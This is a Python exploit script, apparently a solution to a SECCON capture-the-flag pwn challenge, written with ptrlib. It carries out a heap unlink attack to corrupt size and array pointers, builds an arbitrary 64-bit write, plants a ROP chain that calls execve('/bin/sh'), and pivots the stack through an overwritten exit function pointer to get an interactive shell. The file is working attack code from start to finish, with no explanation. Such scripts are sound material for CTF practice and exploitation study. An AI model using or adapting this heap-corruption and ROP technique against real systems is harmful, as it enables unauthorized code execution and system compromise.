from ptrlib import *
from tqdm import tqdm
import os

HOST = os.getenv("SECCON_HOST", "localhost")
PORT = int(os.getenv("SECCON_PORT", "9999"))

def realloc(id, size):
    sock.sendlineafter("> ", "1")
    sock.sendlineafter(": ", id)
    sock.sendlineafter(": ", size)
def edit(id, index, value):
    sock.sendlineafter("> ", "2")
    sock.sendlineafter(": ", id)
    sock.sendlineafter(": ", index)
    sock.sendlineafter(": ", value)

addr_g_size = 0x42E8A0
addr_initfinal_ref = 0x425070
addr_operatingsystem_result = 0x42E8F0
addr_funcptr_exit = 0x42FCE0
addr_binsh = addr_operatingsystem_result - 8

elf = ELF("../files/chall")
#sock = Process("./chall", cwd="../files")
sock = Socket(HOST, PORT)

logger.info("Overwriting size...")

# overwrite size (unlink attack)
realloc(0, 4)
realloc(2, 20)
edit(0, 0, (addr_g_size - 0xb8) & 0xffff)
edit(0, 1, (addr_g_size >> 16) & 0xffff)
edit(0, 2, (addr_g_size >> 32) & 0xffff)
edit(0, 3, (addr_g_size >> 48) & 0xffff)
edit(0, 4, 0x6262) # corrupt chunk flag (fixed->var)
realloc(1, 4)

# overwrite g_size and g_arr
edit(2, 40, (addr_g_size - 0x16) & 0xffff)
edit(2, 41, (addr_g_size >> 16) & 0xffff)
edit(2, 42, (addr_g_size >> 32) & 0xffff)
edit(2, 43, (addr_g_size >> 48) & 0xffff)
realloc(0, 20)

realloc(1, 20)
# overwrite size
edit(1, 0, 0x7fff)
edit(1, 1, 0x7fff)
edit(1, 2, 0x7fff)

def aaw64(addr, val):
    # overwrite g_arr[0]
    edit(1, 15, addr & 0xffff)
    edit(1, 16, (addr >> 16) & 0xffff)
    edit(1, 17, (addr >> 32) & 0xffff)
    edit(1, 18, (addr >> 48) & 0xffff)
    # g_arr[0][0] = val
    edit(2, 0, val & 0xffff)
    edit(2, 1, (val >> 16) & 0xffff)
    edit(2, 2, (val >> 32) & 0xffff)
    edit(2, 3, (val >> 48) & 0xffff)

logger.info("Injecting ROP chain...")

rop_chain = [
    # rsi = 0
    next(elf.gadget('pop rsi; pop r13; pop r12; pop rbx; ret')),
    0, 0, 0, 0,
    # rdi = "/bin/sh"
    next(elf.gadget('pop rdi; pop r14; pop r13; pop r12; pop rbx; ret')),
    addr_binsh, 0, 0, 0, 0,
    # rax = SYS_execve
    next(elf.gadget('pop rax; ret;')),
    syscall.x64.execve,
    # win!
    next(elf.gadget('syscall; ret;')),
]

# operatingsystem_result
for i, gadget in tqdm(enumerate(rop_chain)):
    aaw64(addr_operatingsystem_result + i*8, gadget)

logger.info("Pwning...")

# system exit pointer
aaw64(addr_funcptr_exit, next(elf.gadget('xchg esp, eax; ret;')))
# /bin/sh
aaw64(addr_binsh, u64(b"/bin/sh\0"))
# set initfinal counter to 0
aaw64(addr_initfinal_ref + 8, 0)

# ROP!
logger.info("Win!")
sock.sendlineafter("> ", "0")

sock.sh()

